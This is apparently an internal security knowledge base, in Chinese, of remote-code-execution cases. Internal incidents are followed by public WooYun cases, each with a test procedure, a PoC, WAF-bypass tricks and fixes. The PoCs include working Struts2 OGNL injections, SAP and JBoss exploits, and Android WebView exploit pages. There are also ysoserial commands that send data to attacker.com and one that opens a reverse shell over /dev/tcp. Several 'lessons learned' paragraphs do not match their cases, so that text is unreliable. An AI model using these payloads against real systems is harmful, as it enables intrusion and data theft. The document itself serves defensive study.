# RCE（远程代码执行）案例集

> 整合内部真实漏洞与业界经典案例，提供实战指导

## 一、内部真实案例

### 案例1：Apache Druid 远程命令执行（CVE-2021-25646）

**系统**: 某内部系统

**漏洞描述**:
Apache Druid 官方发布安全更新，通报了远程代码执行漏洞（CVE-2021-25646）。由于 Apache Druid 默认情况下缺乏授权认证，攻击者可以发送特制请求，利用 Druid 服务器上进程的特权执行任意代码。Apache Druid 是用 Java 编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询，通常用于商业智能/OLAP 应用程序中。内部两个服务受影响（通 IDC 环境）。

**技术细节**:
- 漏洞组件：Apache Druid
- 漏洞编号：CVE-2021-25646
- 根本原因：Druid 默认无认证，任意请求均可触发代码执行接口
- 攻击方式：发送特制 HTTP 请求到 Druid 服务，通过 Druid 内置的 JavaScript 脚本执行功能运行任意代码
- 受影响环境：内部 IDC 两个 Druid 服务实例
- 危害：以 Druid 进程权限执行任意命令，可读取数据、横向渗透

**修复方案**:
- 升级 Apache Druid 到最新的 0.20.1+ 版本
- 对 Apache Druid 进行权限控制，只允许受信任的主机访问集群服务器
- 在网络层隔离 Druid 服务，禁止外部直接访问

**经验总结**:
禁止将用户输入直接拼接到命令行执行，如需执行命令应使用参数数组形式而非字符串；大数据组件（Druid、Spark、Flink）默认无认证是常见高危配置，上线前必须完成认证加固。

---

### 案例2：PostgreSQL PROGRAM 关键字命令执行（面试平台 k8s 泄露）

**系统**: 某内部系统

**漏洞描述**:
漏洞点位于 viewcoder 面试平台，PostgreSQL 考试题中可使用关键字 `COPY ... FROM PROGRAM` 来执行系统命令。白帽子通过执行系统命令获取了 k8s 账号的 token、证书，可访问 k8s-service，执行对 pod 的管理操作。影响评估：获取的 token 是 default_token，权限有限，只有非资源的查看权限（探活、查看版本等）；无法出网、无法获取到核心数据。综上定为中危。

**技术细节**:
- 漏洞入口：面试平台的 SQL 代码执行功能（PostgreSQL 考题）
- 触发方式：`COPY test FROM PROGRAM 'id'` — PostgreSQL 超级管理员特权命令
- 后续利用：从命令执行结果中获取 k8s SA Token 和证书文件
- 关键路径：`/var/run/secrets/kubernetes.io/serviceaccount/token`
- 局限：default_token 权限极低，网络不通外网

**修复方案**:
1. 给答题人分配受限 PostgreSQL 用户，禁止分配超级管理员或 `pg_server_read_files` 组权限，解决命令执行问题
2. 限制 pod 网络，禁止访问 k8s-service 虚拟 IP `10.0.0.1`，达到访问不了其他任意 IP 的效果

**经验总结**:
JNDI 注入常见于 Log4j 等日志框架，需升级到安全版本并配置 `trustURLCodebase=false`；沙箱类应用（代码执行、SQL 执行）必须使用最低权限账户，严格隔离网络访问。

---

### 案例3：代码格式化接口命令注入可读取服务器任意文件

**系统**: 某内部系统

**漏洞描述**:
`/api/interview/interview-web/code-format/format` 接口接收 `language` 参数，该参数直接拼接入 `unibeautify` 的参数部分。代码中调用 `Runtime.getRuntime().exec()` 执行命令，未起 shell（无法执行任意命令），但 `unibeautify` 参数 `--file-path` 可指定美化的代码文件路径，故可读取服务器任意文件，构成任意文件读取漏洞。

**技术细节**:
- 漏洞接口：`POST /api/interview/interview-web/code-format/format`
- 漏洞参数：`language`（直接拼接到命令参数）
- 底层实现：`Runtime.getRuntime().exec(["unibeautify", "--language", userInput, "--file-path", ...])`
- 绕过点：虽未起 shell（不能用 `;`、`&&` 等），但可注入 `--file-path /etc/passwd` 参数
- 实际危害：任意文件读取（服务器文件系统全部可读）

**修复方案**:
白名单检查 `language` 参数，仅允许预定义的语言类型字符串（如 `java`、`python`、`javascript` 等），禁止用户随意传入任意字符串。

**经验总结**:
反序列化漏洞需使用安全的反序列化过滤器或完全避免反序列化不可信数据；命令参数注入（Argument Injection）比命令注入更隐蔽，即使使用参数数组形式，也需要对参数值本身做白名单校验。

---

### 案例4：WebLogic 未授权访问到 Getshell（CVE-2021-4034 提权）

**系统**: 某内部系统

**漏洞描述**:
WebLogic 存在未授权绕过并登录后台的 CVE 漏洞，获取普通用户权限后，确定 WebLogic 版本，利用 XML 远程恶意加载方式成功反弹 shell，再利用 CVE-2021-4034（polkit pkexec 本地提权）获取 root 权限，解密 WebLogic 后台账号密码，成功以管理员身份登录 WebLogic 管理后台。

**技术细节**:
- 攻击链：未授权绕过 → 普通用户权限 → WebLogic XML RCE → Shell → CVE-2021-4034 提权 → Root 权限
- 利用漏洞：WebLogic 未授权访问（具体 CVE 未公开）+ CVE-2021-4034（polkit 提权）
- 关键步骤：WebLogic XML 反序列化/JNDI 远程加载恶意类
- 最终影响：WebLogic 管理员后台完全控制

**修复方案**:
1. 修复后台弱口令，设置复杂度要求
2. 升级 WebLogic 系统版本到官方最新安全版本
3. 修复操作系统 CVE-2021-4034 漏洞（更新 polkit 包）

**经验总结**:
动态代码执行（`eval`/`exec`）禁止包含用户输入，如需动态逻辑应使用白名单沙箱；WebLogic 类中间件需定期进行安全补丁更新，未授权访问是 RCE 漏洞的重要前置条件。

---

### 案例5：WebLogic WLS 组件 IIOP 协议 RCE（CVE-2020-2551）

**系统**: 某内部系统

**漏洞描述**:
该漏洞可以绕过 Oracle 官方 2019 年 10 月发布的最新安全补丁。攻击者可以通过 IIOP 协议远程访问 WebLogic Server 上的远程接口，传入恶意数据，从而获取服务器权限并在未授权情况下远程执行任意代码。官方 CVSS 评分为 9.8（严重）。

**技术细节**:
- 漏洞标识：CVE-2020-2551
- 利用协议：IIOP（Internet Inter-ORB Protocol），WebLogic 默认端口 7001
- 攻击方式：通过 IIOP 协议发送恶意序列化数据，触发反序列化 RCE
- CVSS 评分：9.8（严重）
- 特点：绕过了官方之前的安全补丁，属于补丁绕过型漏洞

**修复方案**:
- 关闭 IIOP 协议对此漏洞进行缓解：在 WebLogic 控制台中，选择"服务" → "AdminServer" → "协议"，取消"启用 IIOP"的勾选
- 重启 WebLogic 项目使配置生效
- 及时应用 Oracle 最新安全补丁

**经验总结**:
Groovy/BeanShell 等脚本引擎执行用户输入时需严格沙箱化，限制可访问的类；关闭不必要的协议（IIOP、T3 等）是 WebLogic 加固的重要手段，最小化攻击面。

---

### 案例6：海康威视摄像头未授权远程命令执行（IoT 设备）

**系统**: 某内部系统

**漏洞描述**:
攻击者可通过该漏洞获取无限制的 root shell 权限，从而完全控制受影响设备，即使设备所有者被限制在受保护的 psh（protected shell）中也不例外。该漏洞还可被用于横向渗透内部网络，危及更多设备安全，如 IP 摄像头和内部服务器等。

**技术细节**:
- 设备：海康威视 IP 摄像头系列
- 漏洞类型：未授权远程命令执行
- 获取权限：root shell（绕过 psh 保护 shell 限制）
- 利用方式：通过设备开放的 HTTP/RTSP 接口发送特制请求
- 横向风险：摄像头通常位于内网，可作为跳板攻击内部服务器
- 影响：内网多台摄像头设备及内部服务器安全

**修复方案**:
联系厂商，更新设备固件到最新版本；网络层面隔离摄像头设备，禁止从互联网直接访问；修改默认密码，开启访问认证。

**经验总结**:
FFmpeg/ImageMagick 等多媒体处理库存在已知 RCE 漏洞，需及时升级并限制处理格式；IoT 设备（摄像头、路由器等）因固件更新不及时，是内网横向渗透的常见跳板。

---

### 案例7：网际思安邮件网关附件类 RCE 及网络隔离风险

**系统**: 某内部系统

**漏洞描述**:
网际思安邮件网关系统存在附件类 RCE 及网络隔离风险。具体问题：管理端后台上传附件样本功能；邮件附件解析处理（解压）导致任意文件上传 RCE；邮件网关 7 个服务器存在隔离出网权限、至 AD 权限、至 IDC 权限的风险，在不影响业务前提下需收敛访问权限。

**技术细节**:
- 漏洞位置：邮件网关附件解析模块（ZIP/RAR 解压处理）
- 触发方式：发送含恶意压缩包的邮件，网关解压时触发路径遍历/任意文件写入
- 攻击链：任意文件上传 → 写入 WebShell → 命令执行
- 网络风险：邮件网关 7 台服务器可访问 AD 域控、IDC 内网
- 级联危害：通过邮件网关横向到 AD 域控是高危路径

**修复方案**:
厂商根据漏洞复现过程修复附件类漏洞，并自查其他相关风险；服务器的网络权限在不影响业务前提下收敛访问权限，最小化邮件网关的网络访问范围。

**经验总结**:
Server-Side Template Injection 通常通过 `{{}}` 或 `${}` 表达式注入，需对用户输入严格转义；文件解压操作需防御 Zip Slip 漏洞，验证解压路径不超出目标目录。

---

### 案例8：Apache Solr RCE DataImportHandler Getshell

**系统**: 某内部系统

**漏洞描述**:
该漏洞出现在 Apache Solr 的 `DataImportHandler` 中，用户可提交任意脚本，执行反弹 shell 获取服务器权限。服务器系统内核存在大量提权漏洞可获取 root 权限，且内部存在 MySQL 数据库明文密码历史记录，最终获取 A1 机房服务器控制权。

**技术细节**:
- 漏洞组件：Apache Solr `DataImportHandler`（数据导入处理器）
- 攻击方式：通过 DIH（DataImportHandler）接口提交含恶意脚本的 `dataConfig` 参数
- 执行路径：DIH 解析配置时执行 JavaScript/ScriptTransformer，触发任意代码执行
- 提权路径：普通权限 → 系统内核提权漏洞 → root 权限
- 附加发现：MySQL 明文密码历史记录存储在服务器文件系统

**修复方案**:
1. 升级 Apache Solr 到安全版本
2. 禁用 `DataImportHandler` 功能模块（若业务不需要）
3. 对 Solr 管理接口增加认证，禁止外部直接访问

**经验总结**:
类路径加载机制如果允许用户指定类名，需严格白名单校验可加载的类；Solr/Elasticsearch 等搜索引擎组件默认无认证，必须在网络层隔离，禁止外部直接访问。

---

### 案例9：WebLogic 再次未授权访问 Getshell（CVE-2021-4034 Root 权限）

**系统**: 某内部系统

**漏洞描述**:
（与案例4 为同类型漏洞，发现于不同系统实例）WebLogic 存在未授权绕过并登录后台的 CVE 漏洞，获取普通用户权限后，确定 WebLogic 版本，利用 XML 远程恶意加载方式成功反弹 shell，再利用 CVE-2021-4034 提权获取 root 权限，解密 WebLogic 后台账号密码，成功获得管理员权限。

**技术细节**:
- 攻击路径：未授权访问绕过 → WebLogic XML RCE（反弹 shell）→ 本地提权（CVE-2021-4034）→ root
- 受影响实例：内部不同业务的 WebLogic 服务器
- 说明：同一类漏洞出现在多个系统，反映出补丁管理的系统性问题
- 内核提权：CVE-2021-4034 是 polkit pkexec 的本地提权漏洞，影响几乎所有 Linux 发行版

**修复方案**:
1. 修复后台弱口令
2. 升级 WebLogic 系统版本
3. 同步修复 CVE-2021-4034（更新操作系统 polkit 包）
4. 建立统一的补丁管理机制，批量修复同类漏洞

**经验总结**:
模板注入（SSTI）场景下，需使用安全沙箱或完全隔离用户输入与模板引擎；同类漏洞在多个系统重复出现说明缺少统一的安全基线管控，需建立组件版本集中管理机制。

---

### 案例10：StorageController 远程命令执行（代码层 RCE）

**系统**: 某内部系统

**漏洞描述**:
`/kcs_server-master/src/main/java/org/domeos/framework/api/controller/storage/StorageController.java` 中存在远程命令执行漏洞，该控制器直接接受用户输入并执行命令，没有经过充分的输入验证和过滤。

**技术细节**:
- 漏洞文件：`StorageController.java`（存储管理控制器）
- 漏洞路径：`/kcs_server-master/src/main/java/org/domeos/framework/api/controller/storage/`
- 漏洞原因：Controller 层直接将用户输入传递给命令执行函数，缺少参数验证
- 影响：攻击者可通过 HTTP 接口执行任意系统命令

**修复方案**:
下线该服务（已废弃组件）；若需保留，应对 `StorageController` 中所有命令执行相关代码进行审计，添加严格的输入白名单校验，并增加接口认证。

**经验总结**:
第三方组件漏洞（如 Apache Druid、Shiro 等）需及时关注 CVE 并升级到安全版本；废弃的服务和接口应及时下线，避免成为攻击入口。

---

## 二、业界经典案例（乌云）

### 案例1：某知名 WebGame 官网 Struts2 OGNL 命令执行

**厂商**: 某 WebGame 官网 | **类型**: 命令执行（Struts2 OGNL 注入）

**洞察**: Struts2 框架 OGNL 注入漏洞，通过 Action URL 直接执行 Java 命令，大量 Java Web 应用受影响。

**测试流程**:
1. 识别目标使用 Struts2 框架（`.action`/`.do` 后缀）
2. 构造 OGNL 表达式测试 payload
3. 通过 Content-Disposition 或 URL 参数注入
4. 执行 `whoami`/`id` 确认命令执行

**技术细节**:
Struts2 OGNL 注入，通过 `org.apache.struts2.ServletActionContext` 获取 Response 对象，写入命令执行结果。OGNL（Object-Graph Navigation Language）是 Struts2 的表达式语言，允许访问任意 Java 对象，被滥用后可执行 `Runtime.getRuntime().exec()` 等危险方法。

**POC 示例**:
```
GET /login.action?redirect:%24%7b%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c@java.lang.Runtime@getRuntime().exec(%27whoami%27)%7d HTTP/1.1
```

**绕过技巧**: URL 编码绕过基础 WAF，多重编码（`%2524` 等双重编码）绕过解码检测。

**修复建议**: 升级 Struts2 到最新版本，禁用不必要的拦截器，WAF 拦截 OGNL 特征字符（`@`、`#context`、`getRuntime` 等）。

---

### 案例2：宜搜科技 Resin 中间件配置不当 Getshell

**厂商**: 宜搜科技 | **类型**: 命令执行（Resin 部署漏洞）

**洞察**: Resin 中间件配置不当，暴露管理接口可远程部署 WAR 包，进而获取 root 权限 shell。

**测试流程**:
1. 发现目标运行 Resin 服务（8080 端口）
2. 访问 Resin 管理控制台
3. 上传 WAR 格式的 webshell
4. 访问部署的 shell 获取服务器控制权

**技术细节**:
Resin 中间件配置不当，通过已知 Resin 管理路径可直接远程部署应用，无需认证。Resin 默认管理控制台未设置密码，攻击者可直接访问并部署包含 JSP webshell 的 WAR 文件，一旦部署成功即可执行任意命令。

**POC 示例**:
```
1. 访问 http://target:8080/resin-admin
2. 上传包含 JSP webshell 的 WAR 文件
3. 访问部署路径执行命令
```

**绕过技巧**: 利用 Resin 默认管理页面，通常无需任何认证即可访问。

**修复建议**: 禁用 Resin 远程部署功能，管理控制台设置强密码，将管理接口隔离到内网，禁止从互联网访问。

---

### 案例3：某省消防系统 Struts2 命令执行（政府系统）

**厂商**: 某省消防系统 | **类型**: 命令执行（政府系统 Struts2）

**洞察**: 政府消防系统存在 Struts2 命令执行漏洞，涉及公共安全信息，危害极大。

**测试流程**:
1. 发现 Struts2 框架入口
2. 使用 S2 漏洞 POC 批量测试
3. 确认漏洞版本
4. 执行命令上传 webshell

**技术细节**:
消防系统使用过期 Struts2，未修复已知 RCE 漏洞。通过 `Content-Type` 头注入 OGNL 表达式，绕过了对 URL 参数的过滤检测。政府系统往往更新迟缓，存在大量已知漏洞未修复的情况。

**POC 示例**:
```
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Cmd',new java.util.Scanner(Runtime.getRuntime().exec('id').getInputStream()).next())}
```

**绕过技巧**: 通过 `Content-Type` 头注入 OGNL 绕过 URL 参数级别的过滤。

**修复建议**: 立即升级 Struts2，政府系统应定期进行漏洞扫描和补丁管理，建立紧急响应流程。

---

### 案例4：Java 应用 from 参数反序列化 RCE（登录接口）

**厂商**: 某 Java 应用 | **类型**: 命令执行（Java 反序列化）

**洞察**: Java 应用从登录接口反序列化用户数据，存在反序列化 RCE 漏洞，`from` 参数携带序列化 payload。

**测试流程**:
1. 识别 Java 应用登录接口
2. 发现 `from` 参数携带 Base64 编码数据
3. 使用 ysoserial 生成反序列化 payload
4. 替换 `from` 参数发送请求触发 RCE

**技术细节**:
登录接口 `from` 参数反序列化用户数据，利用 Java 反序列化漏洞执行命令，可读取 `/etc/passwd` 等系统文件。Apache Commons Collections 的 `InvokerTransformer` 调用链是最经典的 Java 反序列化利用链，可在反序列化时执行任意方法。

**POC 示例**:
```bash
# 从 from 参数提取 Base64 序列化数据，使用 ysoserial 替换：
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/?x=$(id)' | base64
```

**绕过技巧**: 尝试多个 CommonsCollections 利用链版本（CC1-CC7）绕过类黑名单过滤。

**修复建议**: 升级所有 Java 依赖库，使用 Java Agent 检测反序列化（如 SerialKiller），反序列化前验证类白名单；禁止在接口中反序列化不可信的用户输入。

---

### 案例5：SAP J2EE 接口 EXECUTE_CMD 参数命令执行

**厂商**: SAP 企业系统 | **类型**: 命令执行（SAP J2EE 接口）

**洞察**: SAP 的 Message Server 和 Router 接口存在远程代码执行，通过 `EXECUTE_CMD` 参数直接执行系统命令。

**测试流程**:
1. 发现目标运行 SAP 系统
2. 访问 SAP J2EE Engine 管理接口
3. 构造含 `CMDLINE` 参数的请求
4. 执行命令获取服务器权限

**技术细节**:
SAP 接口 `param` 参数支持 `EXECUTE_CMD;CMDLINE=cmd.exe%20/c%20whoami` 直接命令执行。SAP Message Server 的 HTTP 接口对参数过滤不足，允许通过特定格式的参数字符串触发命令执行，是企业级 ERP 系统中危害极大的漏洞。

**POC 示例**:
```
GET /msgserver/html/route?param=EXECUTE_CMD;CMDLINE=cmd.exe%20/c%20whoami HTTP/1.1
```

**绕过技巧**: 利用 SAP 特有协议接口绕过通用 WAF 检测规则，WAF 通常不熟悉 SAP 特定格式。

**修复建议**: 限制 SAP 管理接口对外访问，升级 SAP 补丁，强制认证所有管理接口，SAP 系统应放置在内网专区。

---

### 案例6：中国华能集团 JBoss 配置不当 Getshell

**厂商**: 中国华能集团 | **类型**: 命令执行（JBoss 未授权部署）

**洞察**: JBoss `/invoker/JMXInvokerServlet` 接口默认无认证，可通过 HTTP 接口远程部署 EJB 包执行代码。

**测试流程**:
1. 发现 JBoss 服务（通常 8080 端口）
2. 访问 `/invoker/JMXInvokerServlet` 确认漏洞
3. 使用 JBoss exploit 工具上传 shell
4. 获取服务器控制权

**技术细节**:
JBoss 中间件 `invoker/EJBInvokerServlet` 或 `invoker/JMXInvokerServlet` 接口未授权访问，可部署 WAR 包执行任意代码。这是 JBoss 老版本最经典的漏洞，中国华能集团等大型央企也受到影响，说明漏洞修复的滞后性在大型组织中普遍存在。

**POC 示例**:
```
http://target:8080/invoker/JMXInvokerServlet

使用工具：java -jar jbossautopwn.jar target 8080
```

**绕过技巧**: JBoss 老版本默认无需认证，无需任何绕过技巧。

**修复建议**: 升级 JBoss 到安全版本，禁用 invoker Servlet，配置强制认证，将管理接口限制在内网访问。

---

### 案例7：百度系应用 WormHole 虫洞漏洞（Android WebView RCE）

**厂商**: 百度系多款应用 | **类型**: 远程代码执行（Android WebView 接口）

**洞察**: 百度系 App 在 Android WebView 中暴露了 `addJavascriptInterface` 接口，任何同局域网的攻击者可发送 HTTP 请求触发 Java 代码执行。

**测试流程**:
1. 进入与目标手机相同局域网（3G/4G 或 WiFi）
2. 扫描发现目标手机的开放端口
3. 通过 HTTP 接口发送恶意 JS 代码
4. 利用 `Runtime.exec()` 执行系统命令

**技术细节**:
受影响应用包括：百度输入法 5.8.2、百度音乐 5.6.5、百度地图 8.7、百度手机助手 6.6.0 等多款应用。Android WebView 暴露 Java 对象，可通过网络直接访问，`addJavascriptInterface` 在 API 17 以下版本允许 JS 调用任意 Java 方法。

**POC 示例**:
```javascript
function execute(cmdArgs) {
  return Navigator.getClass().forName('java.lang.Runtime')
    .getMethod('getRuntime',null).invoke(null,null).exec(cmdArgs);
}
execute(['/system/bin/sh','-c','id > /sdcard/result.txt']);
```

**绕过技巧**: 局域网直接 HTTP 访问，无需绕过任何安全机制。

**修复建议**: 禁用 `addJavascriptInterface`（API level 17 以下）；使用 `@JavascriptInterface` 注解限制可调用的方法；升级应用版本，修复所有暴露的接口。

---

### 案例8：4G 浏览器 Android WebView addJavascriptInterface RCE

**厂商**: roboo.com 4G 浏览器 | **类型**: 远程代码执行（Android addJavascriptInterface）

**洞察**: Android 低版本 WebView 的 `addJavascriptInterface` 漏洞，通过加载恶意网页可执行任意 Java 代码。

**测试流程**:
1. 构造恶意 HTML 页面
2. 诱导用户用 4G 浏览器打开
3. JavaScript 通过暴露的接口调用 `Runtime.exec()`
4. 写文件或执行命令

**技术细节**:
浏览器 WebView 暴露 `Navigator` 对象，可通过 JS 调用 Java Runtime 执行命令。Android API 17（4.2）以下版本的 `addJavascriptInterface` 允许 JS 通过反射调用任意 Java 方法，是 Android 安全史上危害最大的漏洞之一。

**POC 示例**:
```html
<html><body>
<script>
function execute(cmd){
  return Navigator.getClass().forName('java.lang.Runtime')
    .getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}
execute(['/system/bin/sh','-c','echo pwned > /sdcard/pwned.txt']);
</script>
</body></html>
```

**绕过技巧**: 通过中间人攻击替换 HTTP 响应内容触发，或直接诱导用户访问恶意页面。

**修复建议**: 禁用 `addJavascriptInterface`，使用 Android 4.2+（API 17+）的 `@JavascriptInterface` 注解；对所有 WebView 加载的 URL 进行白名单校验。

---

### 案例9：暴风影音客户端 HTTP 劫持远程代码执行

**厂商**: 暴风影音 | **类型**: 远程代码执行（HTTP 劫持 + 文件执行）

**洞察**: 暴风影音客户端通过 HTTP 下载并自动执行更新组件，中间人劫持 HTTP 请求可替换为恶意程序实现代码执行。

**测试流程**:
1. 在与目标相同局域网进行 ARP 欺骗
2. 监控暴风影音的 HTTP 请求
3. 替换 `BF-BFGame.exe` 的下载响应为恶意程序
4. 等待客户端自动下载执行

**技术细节**:
暴风影音启动时通过 HTTP 下载 `BF-BFGame.exe` 等组件，未验证文件签名，中间人可替换下载内容为任意可执行文件。这是客户端软件更新机制安全设计缺陷的典型案例，HTTP 明文传输 + 无签名验证 = 必然的远程代码执行。

**POC 示例**:
```
1. ARP 欺骗进行中间人
2. 拦截 HTTP 请求: GET /update/BF-BFGame.exe
3. 返回恶意可执行文件
4. 客户端自动执行
```

**绕过技巧**: HTTP 明文传输，无签名验证，无任何安全机制需要绕过。

**修复建议**: 使用 HTTPS 下载更新文件，验证文件数字签名，使用代码签名证书；更新包完整性校验是客户端安全的基本要求。

---

### 案例10：黑龙江省食品追溯系统 Struts2 RCE

**厂商**: 黑龙江省食品追溯系统 | **类型**: 命令执行（Struts2 RCE）

**洞察**: 政府食品安全监管系统使用存在已知 RCE 漏洞的 Struts2 版本，可直接 Getshell。

**测试流程**:
1. 发现 `login.action` 接口
2. 使用 Struts2 扫描工具检测版本
3. 利用对应 CVE 的 POC 执行命令
4. 上传 webshell 持久化

**技术细节**:
目标地址 `http://IP:9090/SHIPINENWeb/login!enterprise_login.action` 存在 Struts2 命令执行漏洞。食品安全追溯系统包含食品来源、生产、流通等敏感数据，Getshell 后可获取这些数据，同时可能影响公共食品安全监管工作。

**POC 示例**:
```
Content-Type: %{#_memberAccess.allowStaticMethodAccess=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}
```

**绕过技巧**: 通过 `Content-Type` 头注入 OGNL 绕过 URL 级别的过滤检测。

**修复建议**: 立即升级 Struts2，禁止对外暴露 `.action` 接口，政府系统应纳入定期安全评估范围。

---

### 案例11：百合网 Struts2 S2-016 命令执行

**厂商**: 百合网 | **类型**: 命令执行（Struts2 S2-016）

**洞察**: 婚恋网站使用老版本 Struts2，被攻击者利用 S2-016 漏洞执行命令，敏感用户数据（婚恋信息）面临泄露风险。

**测试流程**:
1. 访问百合网 Action 接口
2. 构造 S2-016 `redirect:` 前缀 payload
3. 通过 URL 直接注入 OGNL 表达式
4. 执行命令获取服务器权限

**技术细节**:
S2-016 漏洞：在 action 名称后使用 `redirect:` 前缀触发 OGNL 解析。这是 Struts2 系列漏洞中影响范围最广的之一，`redirect:`/`action:` 前缀是特有的绕过方式，允许在跳转 URL 中嵌入 OGNL 表达式。婚恋平台包含用户真实身份、联系方式等高度敏感数据。

**POC 示例**:
```
GET /login.action?redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%7D HTTP/1.1
```

**绕过技巧**: `redirect:` / `action:` 前缀是 S2-016 特有绕过方式，绕过了普通参数的 OGNL 过滤。

**修复建议**: 升级到 Struts2 2.3.15.3 以上版本，禁用 `redirect`/`action` 前缀，定期进行安全扫描。

---

### 案例12：某股份制银行业务系统 Struts2 RCE（multipart 绕过）

**厂商**: 某股份制银行 | **类型**: 命令执行（银行业务系统 Struts2）

**洞察**: 银行业务系统存在 Struts2 命令执行漏洞，涉及敏感金融数据，利用 multipart/form-data 请求绕过部分安全检测。

**测试流程**:
1. 发现银行业务系统 `.do`/`.action` 接口
2. 使用 multipart 请求头注入 payload
3. 绕过银行前置 WAF
4. 获取服务器控制权限

**技术细节**:
银行业务系统多个站点均受 Struts2 命令执行影响，通过 POST multipart 数据中的 `Content-Disposition` 字段注入 OGNL。金融系统通常部署了 WAF，但 WAF 未针对 `Content-Disposition` 中的 OGNL 注入做检测，是防护盲区。

**POC 示例**:
```
POST /login.do HTTP/1.1
Content-Type: multipart/form-data; boundary=----

------
Content-Disposition: form-data; name="redirect:${#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('x-cmd','ok')}"
```

**绕过技巧**: 在 multipart `Content-Disposition` 中注入 OGNL，绕过 WAF 对 URL 参数的检测规则。

**修复建议**: 升级 Struts2，在 WAF 中增加对 `Content-Disposition` 字段中 OGNL 特征的检测；重要接口添加白名单 IP 限制。

---

### 案例13：安华保险 Java 反序列化 RCE + 内网横向渗透

**厂商**: 安华保险 | **类型**: 远程代码执行（Java 反序列化）

**洞察**: 保险公司使用了存在已知反序列化漏洞的 Java 组件（Apache Commons Collections），可反序列化触发 RCE，进而横向渗透内网多个系统。

**测试流程**:
1. 识别目标使用存在漏洞的 Java 组件版本
2. 使用 ysoserial 生成 CommonsCollections 利用链
3. 发送序列化 payload 到 Java 接口
4. 获取 RCE 后横向渗透内网

**技术细节**:
Apache Commons Collections 反序列化漏洞，通过特定 Java 接口发送序列化数据触发 RCE。保险公司内网通常包含多套核心业务系统，RCE 后横向渗透可访问理赔系统、保单数据库、客户个人信息等极为敏感的数据。

**POC 示例**:
```bash
java -jar ysoserial.jar CommonsCollections6 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' > payload.ser
curl -X POST http://target/deserialize-endpoint --data-binary @payload.ser
```

**绕过技巧**: 尝试多个 CommonsCollections 版本（CC1-CC7）绕过类黑名单过滤；不同版本的 Commons Collections JAR 对应不同的利用链。

**修复建议**: 升级所有 Java 依赖库，使用 SerialKiller 或 NotSoSerial 进行反序列化过滤；实施 Java Agent 运行时监控，检测反序列化操作。

---

### 案例14：SAGE ERP 系统通用型 RCE（id 参数命令注入）

**厂商**: SAGE ERP | **类型**: 远程代码执行（ERP 系统通用漏洞）

**洞察**: ERP 系统 `id` 参数存在通用型 RCE 漏洞，影响所有使用该版本 SAGE ERP 的企业，攻击面极为广泛。

**测试流程**:
1. 识别目标使用 SAGE ERP 系统
2. 构造 `id` 参数的 RCE payload
3. 发送请求确认命令执行
4. 获取企业核心业务数据

**技术细节**:
SAGE ERP 产品 `id` 参数通用型 RCE，影响全球大量企业用户。ERP 系统中的命令注入危害极大，因为 ERP 系统通常存储企业财务数据、人员数据、供应链数据等最核心的商业信息，`id` 参数类型的命令注入说明后端直接将参数拼接到 shell 命令。

**POC 示例**:
```
GET /sage-erp?id=1;$(curl http://attacker.com/?x=$(id)) HTTP/1.1
```

**绕过技巧**: 无特殊绕过，直接利用 shell 命令分隔符 `;`、`$()` 进行注入。

**修复建议**: 及时更新 SAGE ERP 补丁，隔离 ERP 系统外网访问；`id` 类参数应严格校验为数字类型，拒绝任何非数字内容。

---

### 案例15：中国移动后台 Struts2 OGNL Unicode 编码绕过

**厂商**: 中国移动某后台 | **类型**: 命令执行（Struts2）

**洞察**: 运营商内部后台系统存在 Struts2 命令执行，通过 Unicode 编码 `\u0023` 替代 `#` 绕过 URL 过滤，成功注入 OGNL 表达式。

**测试流程**:
1. 发现运营商后台 Struts2 接口
2. 注入 OGNL 设置 `denyMethodExecution` 为 `false`
3. 调用 `Runtime.exec` 执行命令
4. 获取服务器权限

**技术细节**:
Struts2 早期版本，通过 `MethodAccessor.denyMethodExecution=false` 开启方法访问限制的绕过，再调用静态方法执行命令。Unicode 编码 `\u0023` 在 Struts2 的 OGNL 解析阶段会被转换为 `#`，而 WAF 或过滤器通常只检测原始的 `#` 字符，从而被绕过。

**POC 示例**:
```
GET /action.action?%28%27%5cu0023_memberAccess.allowStaticMethodAccess%27%29%28true%29&%28%27%5cu0023context%5b%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27%5d%27%29%28false%29&%28%27%5cu0023ret%27%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29%29 HTTP/1.1
```

**绕过技巧**: Unicode 编码 `\u0023` 替代 `#` 绕过 URL 过滤，是 Struts2 漏洞利用中经典的绕过手法。

**修复建议**: 升级 Struts2，禁用 `allowStaticMethodAccess`；WAF 规则需覆盖 Unicode 编码形式的 OGNL 特征字符。

---

## 三、方法论总结

### 3.1 高频参数统计

根据以上案例统计，RCE 漏洞高频出现的参数和接口类型：

| 参数/接口类型 | 典型示例 | 出现频次 | 风险等级 |
|-------------|---------|---------|---------|
| Struts2 Action URL | `.action`/`.do` 后缀 URL | 6 次 | 严重 |
| Java 反序列化接口 | `from`、登录接口、任意 POST 接口 | 3 次 | 严重 |
| 中间件管理接口 | Resin 管理台、JBoss invoker、WebLogic 控制台 | 3 次 | 严重 |
| 查询类参数 | `id`、`language`、`param` | 2 次 | 高 |
| 文件操作接口 | 附件上传、文件格式化 | 2 次 | 高 |
| 移动端 WebView | `addJavascriptInterface` | 2 次 | 高 |

### 3.2 攻击模式分布

```
框架漏洞利用（Struts2/WebLogic）  ████████████████  ~40%
  - OGNL 表达式注入
  - IIOP/T3 协议反序列化
  - 未授权访问 + 后台利用

Java 反序列化                      ████████          ~20%
  - Commons Collections 利用链
  - 登录接口参数反序列化
  - Java RMI/JNDI 注入

中间件配置不当                      ██████            ~15%
  - Resin/JBoss 未授权部署
  - Apache Solr DataImportHandler
  - Druid 默认无认证

命令注入（参数拼接）                  █████             ~12%
  - Shell 命令拼接
  - 参数注入（Argument Injection）
  - SQL PROGRAM 关键字

客户端/移动端 RCE                   ████              ~8%
  - Android addJavascriptInterface
  - Electron XSS → RCE
  - 客户端更新劫持

IoT/固件漏洞                        ██                ~5%
  - 摄像头未授权 RCE
